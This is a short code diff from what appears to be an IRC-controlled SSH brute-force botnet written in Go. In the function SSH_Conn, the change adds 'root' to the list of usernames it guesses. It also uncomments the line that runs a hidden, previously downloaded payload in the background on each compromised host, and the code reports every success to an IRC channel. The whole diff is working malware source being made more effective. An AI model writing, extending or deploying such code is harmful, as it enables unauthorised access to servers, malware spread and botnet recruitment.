@@ -132,7 +132,7 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 		You can add more if you want.
 	*/
 	userList := []string{
-		"admin", "ubuntu", "user", "guest", "support", "login",
+		"admin", "root", "user", "guest", "support", "login",
 	}
 
 	passList := []string{
@@ -169,7 +169,7 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 							time.Sleep(10 * time.Second)
 							IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :\"curl\" Success on "+turnRange)
 							SSH_Session(_session, "chmod +x ."+set_payload)
-							//SSH_Session(_session, "./."+set_payload+" &")
+							go SSH_Session(_session, "./."+set_payload+" &")
 							logCheck = true
 							break
 						} else {
